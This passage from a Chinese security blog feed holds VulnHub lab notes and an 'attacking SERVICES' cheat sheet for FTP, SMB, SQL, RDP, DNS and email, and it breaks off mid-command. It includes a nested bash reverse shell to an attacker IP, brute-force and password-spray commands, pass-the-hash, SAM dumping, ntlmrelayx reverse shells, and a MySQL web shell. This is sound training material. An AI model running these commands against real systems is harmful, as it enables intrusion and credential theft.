href="https://blog.csdn.net/weixin_44862511/article/details/132259658">VulnHub-DarkHole_2靶机实战(超详细保姆级教程)_徐长卿学网安的博客-CSDN博客</a></p><p>这个靶机在网页上布置了.git，通过工具<a href="https://github.com/lijiejie/GitHack">githack</a>、<a href="https://github.com/arthaud/git-dumper">git-dumper</a>下载整个仓库分析</p><p>git log</p><p>git diff XXXX</p><p>提权部分涉及到ssh -l的一个映射，搞了半天终于明白了：</p><blockquote><p>ssh <a href="mailto:&#106;&#101;&#x68;&#x61;&#x64;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x39;&#49;&#x2e;&#x31;&#52;&#50;">&#106;&#101;&#x68;&#x61;&#x64;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x39;&#49;&#x2e;&#x31;&#52;&#50;</a> -L </p><p>9999:192.168.91.144:9999</p><p>这将在本地计算机上创建一个 SSH 隧道，将本地计算机上的 9999 端口的数据转发到远程主机 <code>192.168.91.142</code>，然后由远程主机将数据再次转发到远程主机 <code>192.168.91.144</code> 的 9999 端口。</p><p>其中</p><p>-L [bind_address:]port:forward-host:forward-port</p><ul><li><code>bind_address</code>：这是一个可选部分，表示绑定的本地地址。通常可以省略，使得 SSH 监听所有可用的网络接口。</li><li><code>port</code>：这是本地计算机上监听的端口。</li><li><code>forward-host</code>：这是远程主机的地址。</li><li><code>forward-port</code>：这是远程主机上的端口。</li></ul></blockquote><p>实际上是把本地某端口的数据交由ssh连接的主机再转发，相当于代理的感觉</p><p>在反弹shell的时候发现bash -i不能反弹，具体原因不是很清楚，但是嵌套**<code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.91.140/9001 0&gt;&amp;1&#39;</code>**成功反弹，查询后发现：</p><blockquote><p>嵌套 shell 的原因有以下几点：</p><ol><li><strong>维持稳定性</strong>：嵌套 shell 可以在连接中保持稳定，即使连接的初始 shell 会话（例如通过 <code>nc</code> 或 <code>bash</code> 创建的连接）被关闭或中断，嵌套 shell 可以继续运行，确保攻击者能够继续执行操作。</li><li><strong>隐藏连接</strong>：嵌套 shell 可以隐藏连接细节，使连接更加隐蔽。通过将初始连接与嵌套 shell 连接分开，可以减少检测和防御系统发现连接的风险。</li><li><strong>适应性</strong>：嵌套 shell 可以在不同的环境和情况下更灵活地使用。例如，通过在嵌套 shell 中执行各种命令，攻击者可以根据需要进行操作。</li><li><strong>错误处理</strong>：嵌套 shell 可以处理连接中的错误情况，确保连接中断或其他问题不会导致整个攻击操作失败。</li></ol></blockquote><p>如果单层的反弹不行，可以试一下嵌套</p><p>另外发现：crontab只能查看当前用户的定时任务，直接读取&#x2F;etc&#x2F;crontab可以查看本机上的定时任务</p><p>ss命令：</p><p><code>ss</code>（Socket Statistics）命令是一个用于显示关于网络套接字（socket）信息的实用工具，通常用于查看网络连接、监听端口、套接字状态等。<code>ss</code> 命令取代了早期的 <code>netstat</code> 命令，并提供更快速和更详细的网络信息。</p><p><code>ss</code>（Socket Statistics）命令是一个用于显示关于网络套接字（socket）信息的实用工具，通常用于查看网络连接、监听端口、套接字状态等。<code>ss</code> 命令取代了早期的 <code>netstat</code> 命令，并提供更快速和更详细的网络信息。</p><p>以下是一些常用的 <code>ss</code> 命令选项和用法示例：</p><ol><li><p><strong>显示所有网络连接</strong>：</p><pre><code class="bash">ss -tuln</code></pre><p>这会显示所有 TCP（-t）和 UDP（-u）连接的监听端口（-l）信息，以数字格式显示（-n）。</p></li><li><p><strong>显示指定端口的监听情况</strong>：</p><pre><code class="bash">ss -tuln | grep 80</code></pre><p>这会过滤并显示所有监听端口为 80 的连接。</p></li><li><p><strong>显示套接字统计信息</strong>：</p><pre><code class="bash">ss -s</code></pre><p>这会显示套接字统计信息，包括打开的套接字数量、连接状态等。</p></li><li><p><strong>显示 TCP 套接字信息</strong>：</p><pre><code class="bash">ss -t</code></pre><p>这会显示所有 TCP 套接字的详细信息。</p></li><li><p><strong>显示 UDP 套接字信息</strong>：</p><pre><code class="bash">ss -u</code></pre><p>这会显示所有 UDP 套接字的详细信息。</p></li><li><p><strong>显示 Unix 套接字信息</strong>：</p><pre><code class="bash">ss -x</code></pre><p>这会显示所有 Unix 套接字（本地套接字）的详细信息。</p></li><li><p><strong>显示特定用户的套接字信息</strong>：</p><pre><code class="bash">ss -tuln | grep username</code></pre><p>这会过滤并显示与特定用户名相关的连接信息。</p></li><li><p><strong>显示所有套接字信息（包括监听和连接）</strong>：</p><pre><code class="bash">ss -a</code></pre><p>这会显示所有套接字的信息，包括监听和连接状态。</p></li></ol><p>一般可以先-s查看统计信息然后再具体查看相关类型套接字</p><h1 id="BEELZEBUB-1"><a href="#BEELZEBUB-1" class="headerlink" title="BEELZEBUB: 1"></a>BEELZEBUB: 1</h1><p><a href="https://www.cnblogs.com/upfine/p/16888142.html">upfine的博客 (cnblogs.com)</a></p><p>感觉主要是枚举，但有一些扫到的可能有用的目录啥的确实没用上，这里有一个专门针对wp的wpscan，使用-e可以进行枚举，-force忽略检测网站是否是wordpress</p><p>这里提权又遇到policykit，发现在exdb上查询相关名称可以检索到</p><h1 id="hackable-III"><a href="#hackable-III" class="headerlink" title="hackable III"></a>hackable III</h1><p><a href="https://blog.csdn.net/weixin_39368364/article/details/119917637">VulnHub靶机_HACKABLE: III_Yiru Zhao的博客-CSDN博客</a></p><p>图片隐写、端口碰撞、lxd提权</p><p>这里端口碰撞但是没办法启动端口。。。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一些在打靶学习的时候遇到的一些有意思的idea或者方法等&lt;/p&gt;</summary>
    
    
    
    
    <category term="vulnhub" scheme="https://taninluv.github.io/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>attacking SERVICES</title>
    <link href="https://taninluv.github.io/2023/08/10/SERVICES/"/>
    <id>https://taninluv.github.io/2023/08/10/SERVICES/</id>
    <published>2023-08-10T01:57:02.000Z</published>
    <updated>2023-08-20T11:01:36.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Attacking-FTP"><a href="#Attacking-FTP" class="headerlink" title="Attacking FTP"></a>Attacking FTP</h1><h4 id="Brute-Forcing"><a href="#Brute-Forcing" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h4><p> <a href="https://github.com/jmk-foofus/medusa">Medusa</a></p><p>使用Medusa，我们可以使用选项-u指定要针对的单个用户，也可以使用选项-u提供一个包含用户名列表的文件。选项-P用于包含密码列表的文件。我们可以使用选项-M和目标协议（FTP），并使用选项-h作为目标主机名或IP地址。</p><span id="more"></span><pre><code class="shell-session">Tanin@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp </code></pre><h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="攻击-FTP"><a href="#攻击-FTP" class="headerlink" title="攻击 FTP"></a>攻击 FTP</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>ftp 192.168.2.142</code></td><td>使用客户端连接到 FTP 服务器。<code>ftp</code></td></tr><tr><td><code>nc -v 192.168.2.142 21</code></td><td>使用 连接到 FTP 服务器。<code>netcat</code></td></tr><tr><td><code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142</code></td><td>暴力破解 FTP 服务。</td></tr></tbody></table><hr><h2 id="攻击中小企业"><a href="#攻击中小企业" class="headerlink" title="攻击中小企业"></a>攻击中小企业</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>smbclient -N -L //10.129.14.128</code></td><td>针对 SMB 服务的空会话测试。</td></tr><tr><td><code>smbmap -H 10.129.14.128</code></td><td>使用 进行网络共享枚举。<code>smbmap</code></td></tr><tr><td><code>smbmap -H 10.129.14.128 -r notes</code></td><td>使用 .<code>smbmap</code></td></tr><tr><td><code>smbmap -H 10.129.14.128 --download &quot;notes\note.txt&quot;</code></td><td>从共享文件夹下载特定文件。</td></tr><tr><td><code>smbmap -H 10.129.14.128 --upload test.txt &quot;notes\test.txt&quot;</code></td><td>将特定文件上传到共享文件夹。</td></tr><tr><td><code>rpcclient -U&#39;%&#39; 10.10.110.17</code></td><td>空会话与 .<code>rpcclient</code></td></tr><tr><td><code>./enum4linux-ng.py 10.10.11.45 -A -C</code></td><td>使用 自动枚举 SMB 服务。<code>enum4linux-ng</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39;</code></td><td>针对列表中的不同用户喷洒密码。</td></tr><tr><td><code>impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17</code></td><td>使用 连接到 SMB 服务。<code>impacket-psexec</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexec</code></td><td>使用 对 SMB 服务执行命令。<code>crackmapexec</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users</code></td><td>枚举登录用户。</td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam</code></td><td>从 SAM 数据库中提取哈希。</td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></td><td>使用哈希传递技术在目标主机上进行身份验证。</td></tr><tr><td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></td><td>使用 转储 SAM 数据库。<code>impacket-ntlmrelayx</code></td></tr><tr><td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e &lt;base64 reverse shell&gt;</code></td><td>使用 执行基于 PowerShell 的反向外壳。<code>impacket-ntlmrelayx</code></td></tr></tbody></table><hr><h2 id="攻击-SQL-数据库"><a href="#攻击-SQL-数据库" class="headerlink" title="攻击 SQL 数据库"></a>攻击 SQL 数据库</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>mysql -u julio -pPassword123 -h 10.129.20.13</code></td><td>连接到 MySQL 服务器。</td></tr><tr><td><code>sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P &#39;MyPassword!&#39; -y 30 -Y 30</code></td><td>连接到 MSSQL 服务器。</td></tr><tr><td><code>sqsh -S 10.129.203.7 -U julio -P &#39;MyPassword!&#39; -h</code></td><td>从 Linux 连接到 MSSQL 服务器。</td></tr><tr><td><code>sqsh -S 10.129.203.7 -U .\\julio -P &#39;MyPassword!&#39; -h</code></td><td>从 Linux 连接到 MSSQL 服务器，而 MSSQL 服务器使用 Windows 身份验证机制。</td></tr><tr><td><code>mysql&gt; SHOW DATABASES;</code></td><td>显示 MySQL 中的所有可用数据库。</td></tr><tr><td><code>mysql&gt; USE htbusers;</code></td><td>在 MySQL 中选择一个特定的数据库。</td></tr><tr><td><code>mysql&gt; SHOW TABLES;</code></td><td>在 MySQL 中显示所选数据库中的所有可用表。</td></tr><tr><td><code>mysql&gt; SELECT * FROM users;</code></td><td>从MySQL中的“用户”表中选择所有可用条目。</td></tr><tr><td><code>sqlcmd&gt; SELECT name FROM master.dbo.sysdatabases</code></td><td>显示 MSSQL 中的所有可用数据库。</td></tr><tr><td><code>sqlcmd&gt; USE htbusers</code></td><td>在 MSSQL 中选择特定的数据库。</td></tr><tr><td><code>sqlcmd&gt; SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES</code></td><td>在 MSSQL 中显示所选数据库中的所有可用表。</td></tr><tr><td><code>sqlcmd&gt; SELECT * FROM users</code></td><td>从 MSSQL 中的“用户”表中选择所有可用条目。</td></tr><tr><td><code>sqlcmd&gt; EXECUTE sp_configure &#39;show advanced options&#39;, 1</code></td><td>允许更改高级选项。</td></tr><tr><td><code>sqlcmd&gt; EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1</code></td><td>启用xp_cmdshell。</td></tr><tr><td><code>sqlcmd&gt; RECONFIGURE</code></td><td>在每个sp_configure命令之后使用以应用更改。</td></tr><tr><td><code>sqlcmd&gt; xp_cmdshell &#39;whoami&#39;</code></td><td>从 MSSQL 服务器执行系统命令。</td></tr><tr><td><code>mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;</code></td><td>使用 MySQL 创建一个文件。</td></tr><tr><td><code>mysql&gt; show variables like &quot;secure_file_priv&quot;;</code></td><td>检查安全文件权限是否为空，以读取系统上本地存储的文件。</td></tr><tr><td><code>sqlcmd&gt; SELECT * FROM OPENROWSET(BULK N&#39;C:/Windows/System32/drivers/etc/hosts&#39;, SINGLE_CLOB) AS Contents</code></td><td>读取 MSSQL 中的本地文件。</td></tr><tr><td><code>mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);</code></td><td>在 MySQL 中读取本地文件。</td></tr><tr><td><code>sqlcmd&gt; EXEC master..xp_dirtree &#39;\\10.10.110.17\share\&#39;</code></td><td>使用 MSSQL 中的命令进行哈希窃取。<code>xp_dirtree</code></td></tr><tr><td><code>sqlcmd&gt; EXEC master..xp_subdirs &#39;\\10.10.110.17\share\&#39;</code></td><td>使用 MSSQL 中的命令进行哈希窃取。<code>xp_subdirs</code></td></tr><tr><td><code>sqlcmd&gt; SELECT srvname, isremote FROM sysservers</code></td><td>标识 MSSQL 中的链接服务器。</td></tr><tr><td><code>sqlcmd&gt; EXECUTE(&#39;select @@servername, @@version, system_user, is_srvrolemember(&#39;&#39;sysadmin&#39;&#39;)&#39;) AT [10.0.0.12\SQLEXPRESS]</code></td><td>标识用户及其在 MSSQL 中用于远程连接的权限。</td></tr></tbody></table><hr><h2 id="攻击-RDP"><a href="#攻击-RDP" class="headerlink" title="攻击 RDP"></a>攻击 RDP</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c &#39;password123&#39;</code></td><td>针对 RDP 服务喷洒密码。</td></tr><tr><td><code>hydra -L usernames.txt -p &#39;password123&#39; 192.168.2.143 rdp</code></td><td>暴力破解 RDP 服务。</td></tr><tr><td><code>rdesktop -u admin -p password123 192.168.2.143</code></td><td>在 Linux 中使用连接到 RDP 服务。<code>rdesktop</code></td></tr><tr><td><code>tscon #&#123;TARGET_SESSION_ID&#125; /dest:#&#123;OUR_SESSION_NAME&#125;</code></td><td>在没有密码的情况下模拟用户。</td></tr><tr><td><code>net start sessionhijack</code></td><td>执行 RDP 会话劫持。</td></tr><tr><td><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></td><td>在目标 Windows 主机上启用“受限管理模式”。</td></tr><tr><td><code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA</code></td><td>使用哈希传递技术在没有密码的情况下登录目标主机。</td></tr></tbody></table><hr><h2 id="攻击域名解析"><a href="#攻击域名解析" class="headerlink" title="攻击域名解析"></a>攻击域名解析</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</code></td><td>对特定名称服务器执行 AXFR 区域传输尝试。</td></tr><tr><td><code>subfinder -d inlanefreight.com -v</code></td><td>暴力破解子域。</td></tr><tr><td><code>host support.inlanefreight.com</code></td><td>指定子域的 DNS 查找。</td></tr></tbody></table><hr><h2 id="攻击电子邮件服务"><a href="#攻击电子邮件服务" class="headerlink" title="攻击电子邮件服务"></a>攻击电子邮件服务</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>host -t MX microsoft.com</code></td><td>指定域的邮件服务器的 DNS 查找。</td></tr><tr><td>&#96;dig mx inlanefreight.com</td><td>grep “MX”</td></tr><tr><td><code>host -t A mail1.inlanefreight.htb.</code></td><td>指定子域的 IPv4 地址的 DNS 查找。</td></tr><tr><td><code>telnet 10.10.110.20 25</code></td><td>连接到 SMTP 服务器。</td></tr><tr><td><code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></td><td>对指定主机使用 RCPT 命令进行 SMTP 用户枚举。</td></tr><tr><td><code>python3 o365spray.py --validate --domain msplaintext.xyz</code></td><td>验证指定域的 Office365 使用情况。</td></tr><tr><td><code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code></td><td>枚举在指定域上使用 Office365 的现有用户。</td></tr><tr><td><code>python3 o365spray.py --spray -U usersfound.txt -p &#39;March2022!&#39; --count 1 --lockout 1 --domain msplaintext.xyz</code></td><td>针对对指定域使用 Office365 的用户列表进行密码喷涂。</td></tr><tr><td><code>hydra -L users.txt -p &#39;Company01!&#39; -f 10.10.110.20 pop3</code></td><td>暴力破解 POP3 服务。</td></tr><tr><td><code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#39;Subject: Notification&#39; --body &#39;Message&#39; --server 10.10.11.213</code></td><td>测试 SMTP 服务是否存在开放中继漏洞。</td></tr></tbody></table><h1 id="Attacking-FTP-1"><a href="#Attacking-FTP-1" class="headerlink" title="Attacking FTP"></a>Attacking FTP</h1><h4 id="Brute-Forcing-1"><a href="#Brute-Forcing-1" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h4><h4 id="FTP-Bounce-Attack"><a href="#FTP-Bounce-Attack" class="headerlink" title="FTP Bounce Attack"></a>FTP Bounce Attack</h4><p>FTP反弹攻击 FTP反弹攻击是一种使用FTP服务器将出站流量传递到网络上另一个设备的网络攻击。攻击者使用PORT命令诱骗FTP连接运行命令并从预期服务器以外的设备获取信息。 假设我们的目标是暴露在互联网上的FTP服务器FTP_DMZ。同一网络中的另一个设备Internal_DMZ没有暴露在互联网上。我们可以使用与FTP_DMZ服务器的连接，使用FTP Bounce攻击扫描Internal_DMZ，并获取有关服务器打开端口的信息。然后，我们可以将这些信息作为攻击基础设施的一部分。</p><p>Nmap-b标志可用于执行FTP反弹攻击：</p><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2</code></pre><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>FTP 服务在哪个端口上运行？</p><p>FTP 服务器可以使用什么用户名？</p><p>使用发现的用户名及其密码通过SSH登录并获取标志.txt文件。提交内容作为您的答案。</p></blockquote><p>先扫描主机：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111503815.png" alt="image-20230811150309711">发现都有防火墙保护，挨个端口扫描发现2121端口开了ftp服务</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111504966.png" alt="image-20230811150445925"></p><p>他这里允许匿名登录ftp，链接上去后发现了一个密码本和一个用户列表，用hydra或者Medusa爆破一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111506125.png" alt="image-20230811150617076"></p><p>然后ssh登录即可</p><h1 id="Attacking-SMB"><a href="#Attacking-SMB" class="headerlink" title="Attacking SMB"></a>Attacking SMB</h1><p>根据SMB实现和操作系统的不同，我们将使用Nmap获得不同的信息。请记住，在针对Windows操作系统时，版本信息通常不会包含在Nmap扫描结果中。相反，Nmap将尝试猜测操作系统的版本。然而，我们通常需要其他扫描来确定目标是否容易受到特定攻击。我们将在本节稍后介绍搜索已知漏洞。现在，让我们扫描端口139和445 TCP。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CESTNmap scan report for 10.129.14.128Host is up (0.00024s latency).PORT    STATE SERVICE     VERSION139/tcp open  netbios-ssn Samba smbd 4.6.2445/tcp open  netbios-ssn Samba smbd 4.6.2MAC Address: 00:00:00:00:00:00 (VMware)Host script results:|_nbstat: NetBIOS name: HTB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2021-09-19T13:16:04|_  start_date: N/A</code></pre><p>Nmap扫描揭示了目标的基本信息： SMB版本（Samba-smbd 4.6.2） 主机名HTB 操作系统是基于SMB实现的Linux</p><h4 id="Anonymous-Authentication"><a href="#Anonymous-Authentication" class="headerlink" title="Anonymous Authentication"></a>Anonymous Authentication</h4><p>如果我们找到一个不需要用户名和密码或找到有效凭据的SMB服务器，我们可以获得共享、用户名、组、权限、策略、服务等的列表。大多数与SMB交互的工具都允许空会话连接，包括smbclient、smbmap、rpcclient或enum4linux。让我们探讨一下如何使用null身份验证与文件共享和RPC进行交互。</p><h4 id="File-Share"><a href="#File-Share" class="headerlink" title="File Share"></a>File Share</h4><p>使用smbclient，我们可以使用选项-L显示服务器的共享列表，使用选项-N，我们告诉smbclient使用null会话。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbclient -N -L //10.129.14.128        Sharename       Type      Comment        -------      --     -------        ADMIN$          Disk      Remote Admin        C$              Disk      Default share        notes           Disk      CheckIT        IPC$            IPC       IPC Service (DEVSM)SMB1 disabled no workgroup available</code></pre><p>Smbmap是另一个帮助我们枚举网络共享和访问相关权限的工具。smbmap的一个优点是它为每个共享文件夹提供了一个权限列表。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                           Disk                                                    Permissions     Comment        --                                                   ---------    -------        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        IPC$                                                    READ ONLY       IPC Service (DEVSM)        notes                                                   READ, WRITE     CheckIT</code></pre><p>使用带有-r或-r（递归）选项的smbmap，可以浏览目录：</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 -r notes[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                                   Disk                                                    Permissions     Comment        --                                                   ---------    -------        notes                                                   READ, WRITE        .\notes\*        dr--r--r               0 Mon Nov  2 00:57:44 2020    .        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup</code></pre><p>从上面的例子中，权限被设置为READ和WRITE，可以用来上传和下载文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 --download &quot;notes\note.txt&quot;[+] Starting download: notes\note.txt (116 bytes)[+] File output to: /htb/10.129.14.128-notes_note.txt</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt &quot;notes\test.txt&quot;[+] Starting upload: test.txt (20 bytes)[+] Upload complete.</code></pre><h4 id="Remote-Procedure-Call-RPC"><a href="#Remote-Procedure-Call-RPC" class="headerlink" title="Remote Procedure Call (RPC)"></a>Remote Procedure Call (RPC)</h4><p>我们可以使用带有空会话的rpcclient工具来枚举工作站或域控制器。 rpcclient工具为我们提供了许多不同的命令，用于在SMB服务器上执行特定功能，以收集信息或修改服务器属性（如用户名）。我们可以使用SANS研究所的这份备忘单，也可以查看客户端手册页上所有这些功能的完整列表。</p><pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U&#39;%&#39; 10.10.110.17rpcclient $&gt; enumdomusersuser:[mhope] rid:[0x641]user:[svc-ata] rid:[0xa2b]user:[svc-bexec] rid:[0xa2c]user:[roleary] rid:[0xa36]user:[smorgan] rid:[0xa37]</code></pre><p>Brute Forcing和密码喷雾 当暴力强制时，我们会对一个帐户尝试尽可能多的密码，但如果我们达到阈值，它会锁定一个帐户。我们可以使用暴力，如果我们知道的话，可以在达到阈值之前停止。否则，我们不建议使用暴力。 密码喷洒是一个更好的选择，因为我们可以用一个通用密码锁定用户名列表，以避免帐户锁定。如果我们知道帐户锁定阈值，我们可以尝试多个密码。通常，两到三次尝试是安全的，只要我们在两次尝试之间等待30-60分钟。让我们探索一下<a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> 工具，它包括执行密码喷涂的功能。 使用CrackMapExec（CME），我们可以针对多个IP，使用大量用户和密码。让我们来探索一个密码喷涂的日常使用案例。要对一个IP执行密码喷洒，我们可以使用选项-u指定带有用户列表的文件，使用选项-p指定密码。这将尝试使用提供的密码对列表中的每个用户进行身份验证。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39; --local-authSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE </code></pre><blockquote><p>注意：默认情况下，CME将在成功登录后退出。使用–continue-on-success标志将继续喷洒，即使在找到有效密码后也是如此。它对于向大型用户列表喷洒单个密码非常有用。此外，如果我们的目标是一台未加入域的计算机，我们将需要使用选项–local-auth。有关更详细的研究密码喷洒，请参阅Active Directory枚举和攻击模块。</p></blockquote><h4 id="Remote-Code-Execution-RCE"><a href="#Remote-Code-Execution-RCE" class="headerlink" title="Remote Code Execution (RCE)"></a>Remote Code Execution (RCE)</h4><h4 id="Impacket-PsExec"><a href="#Impacket-PsExec" class="headerlink" title="Impacket PsExec"></a>Impacket PsExec</h4><pre><code class="shell-session">Tanin@htb[/htb]$ impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17</code></pre><h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>我们可以用来运行CMD或PowerShell的另一个工具是CrackMapExec。CrackMapExec的一个优点是可以一次在多个主机上运行命令。要使用它，我们需要指定协议、smb、IP地址或IP地址范围，选项-u表示用户名，-p表示密码，选项-x用于运行cmd命令，大写-x用于运行PowerShell命令。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexecSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexecSMB         10.10.110.17 445    WIN7BOX  nt authority\system</code></pre><blockquote><p>注意：如果没有定义–exec方法，CrackMapExec将尝试执行atexec方法，如果失败，您可以尝试指定–exec方式smbexec。</p></blockquote><h4 id="Enumerating-Logged-on-Users"><a href="#Enumerating-Logged-on-Users" class="headerlink" title="Enumerating Logged-on Users"></a>Enumerating Logged-on Users</h4><p>想象一下，我们在一个有多台机器的网络中。其中一些共享相同的本地管理员帐户。在这种情况下，我们可以使用CrackMapExec枚举同一网络中所有机器上的登录用户10.10.110.17&#x2F;24，这加快了我们的枚举过程。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users</code></pre><h4 id="Extract-Hashes-from-SAM-Database"><a href="#Extract-Hashes-from-SAM-Database" class="headerlink" title="Extract Hashes from SAM Database"></a>Extract Hashes from SAM Database</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam</code></pre><h4 id="Pass-the-Hash-PtH"><a href="#Pass-the-Hash-PtH" class="headerlink" title="Pass-the-Hash (PtH)"></a>Pass-the-Hash (PtH)</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></pre><h4 id="Forced-Authentication-Attacks"><a href="#Forced-Authentication-Attacks" class="headerlink" title="Forced Authentication Attacks"></a>Forced Authentication Attacks</h4><p>我们还可以通过创建假SMB服务器来捕获用户的NetNTLM v1&#x2F;v2哈希，从而滥用SMB协议。 执行此类操作的最常见工具是Responder。Responder是一种LLMNR、NBT-NS和MDNS投毒器工具，具有不同的功能，其中之一是可以设置虚假服务，包括SMB，以窃取NetNTLM v1&#x2F;v2哈希。在其默认配置中，它将查找LLMNR和NBT-NS流量。然后，它将代表受害者正在寻找的服务器进行响应，并捕获他们的NetNTLM哈希。 让我们举例说明Responder是如何工作的。想象一下，我们使用响应程序默认配置创建了一个假的SMB服务器，并使用以下命令：</p><pre><code class="shell-session">Tanin@htb[/htb]$ responder -I &lt;interface 